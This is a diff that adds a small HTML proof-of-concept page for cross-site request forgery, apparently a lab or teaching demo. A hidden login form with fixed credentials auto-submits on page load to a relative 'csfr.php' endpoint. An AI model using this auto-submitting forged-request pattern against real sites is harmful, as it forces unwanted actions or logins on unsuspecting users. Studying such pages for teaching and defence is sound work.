@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF Attack Page</title>
+</head>
+<body>
+    <h1>This page silently submits a login request...</h1>
+
+    <form id="csrf_form" method="POST" action="csfr.php">
+        <input type="hidden" name="username" value="host">
+        <input type="hidden" name="password" value="pass">
+    </form>
+
+    <script>
+        document.getElementById("csrf_form").submit();
+    </script>
+</body>
+</html>
